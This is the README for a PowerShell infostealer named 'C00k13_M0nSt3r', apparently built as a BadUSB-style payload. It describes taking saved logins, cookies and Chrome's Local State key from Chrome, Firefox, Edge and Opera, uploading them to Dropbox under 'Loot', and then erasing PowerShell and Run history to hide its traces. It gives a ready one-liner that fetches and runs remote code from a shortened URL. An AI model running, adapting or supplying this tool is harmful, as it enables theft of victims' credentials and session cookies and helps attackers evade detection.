# C00k13_M0nSt3r

## Overview
This script is designed to extract saved logins, cookies, and browser data from Google Chrome, Microsoft Edge, Mozilla Firefox, and Opera browsers. The extracted data is then uploaded to Dropbox in a new folder named "Loot," followed by a subfolder named after the username associated with the data.

## Features
- Extracts saved logins and cookies from Google Chrome.
- Retrieves saved logins and cookies from Mozilla Firefox.
- Captures browser history and bookmarks from Chrome, Edge, Firefox, and Opera.
- Uploads the extracted data to Dropbox for remote access.

## Usage
1. Update the Dropbox token in the script by replacing `'INSERT-YOUR-DROPBOX-TOKEN'` with your actual Dropbox token.
2. Run the script in PowerShell using the provided payload: $db = 'INSERT-YOUR-DROPBOX-TOKEN'; irm tinyurl.com/3tm7msr7 | iex

## Supported Platforms
- Windows 10/11

## Instructions
1. The script grabs Google Chrome data (Login Data, Cookies, and Local State) and compresses it into a zip file.
2. Firefox data (cookies, saved logins) is searched for and compressed into a separate zip file.
3. Browser history and bookmarks are collected from Chrome, Edge, Firefox, and Opera and saved in a file named `--BrowserData.txt`.
4. All extracted data is uploaded to Dropbox using the provided Dropbox token.

## Credits
- Browser history and bookmarks extraction code adapted from [I-Am-Jakoby's browserData.ps1 script](https://github.com/I-Am-Jakoby/Flipper-Zero-BadUSB/blob/main/Payloads/Flip-BrowserData/browserData.ps1).

## Version
2.0

## Author
Created By: 0D1NSS0N

## Cleanup
After data exfiltration, the script performs cleanup by deleting temporary files, removing run dialog and PowerShell history, and emptying the recycling bin.

## Disclaimer
Use this script responsibly and only for ethical purposes. Unauthorized access and data exfiltration are against the law.

**Note:** Please be cautious while handling sensitive information and respect privacy and legal regulations.

